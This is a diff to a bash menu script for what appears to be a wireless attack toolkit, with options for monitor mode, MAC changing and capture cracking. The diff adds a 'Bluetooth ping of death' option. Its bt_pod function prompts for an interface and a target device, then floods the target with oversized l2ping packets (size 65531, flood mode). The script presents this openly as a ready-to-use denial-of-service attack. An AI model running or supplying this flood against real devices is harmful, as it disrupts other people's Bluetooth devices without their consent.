@@ -33,15 +33,19 @@ printf "
 (3) MONITOR MODE MENU
 (4) CHANGE MAC ADDRES
 (5) SHOW WIRELESS IFACES
-(6) CRACK CAPTURE
+(6) CRACK CAPTURE\n"
+printf "\e[0m--------------------------" | lolcat -F 3
+
+printf "
+(7) BLUETOOTH POD
 "
 printf "\e[0m--------------------------" | lolcat -F 3
 printf "
-(7) SETTINGS
+(8) SETTINGS
 "
 printf "\e[0m--------------------------" | lolcat -F 3
 printf "
-(8) EXIT\n
+(9) EXIT\n
 " 
 
 read -p "SELECT: " auramenu
@@ -59,9 +63,11 @@ case $auramenu in
     
     6) crackcap ;;
     
-    7) settings ;;
+    7) bt_pod ;;
     
-    8) exit ; clear ;;
+    8) settings ;;
+    
+    9) exit ; clear ;;
     
     *) printf "\e[93mINCORRECT OPTION...\n"; exit;;
     esac
@@ -902,6 +908,22 @@ check2()
                 ;;
             esac
 }
+
+bt_pod()
+{
+    banner
+    printf "\e[0m\n"
+    read -p "BT INTERFACE: " device
+    read -p "TARGET: " target
+    printf "\e[96mSTARTING BT PING OF DEATH ATTACK...\n"
+    hciconfig $device up
+    l2ping -i $device -s 65531 -f $target
+    printf "DONE!\n"
+    read -p "press [ENTER] to back" variable
+    auramenu
+}
+
+
 
 
 rootcheck
